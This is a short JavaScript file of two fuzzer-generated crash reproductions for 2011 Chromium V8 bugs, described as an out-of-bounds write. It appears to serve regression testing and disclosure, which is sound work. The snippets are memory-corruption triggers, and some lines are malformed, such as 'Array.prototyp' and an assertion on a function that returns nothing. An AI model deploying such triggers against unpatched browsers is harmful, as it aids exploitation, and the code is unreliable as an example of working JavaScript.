// Severity: High
// Date: Oct 1, 2011 / Oct 5, 2011
// Chrome version: 15.0.865, 16.0.891.0
// URL: [1] https://bugs.chromium.org/p/chromium/issues/detail?id=98773
//      [2] https://bugs.chromium.org/p/chromium/issues/detail?id=99167
// Christian Holler [LangFuzz]

// Out of bounds write in v8
// [1]
var nonArray = {length: 0xb, 0:42, 2:37, "\xda": undefined, 4:0};
Array.prototyp.sort.call(new Int16Array(345), this);

// [2]
Object.prototype.__defineGetter__("x", function() {});
function Node() {
    this.a = 1;
    this.b = 3;
}
var n1 = new Node();
function for_in_null() {
    try {
        for (var x in undefined) {}
    } catch(e) {}
}

for (var i=0; i<10; ++i) {
    gc();
}

function f() {
    for(var i=0; i<1000000; i++) {
        var n1 = new Node();
    }
}

for (var i=0; i<2; i++) {
    assertEquals(500009500000, f());
}
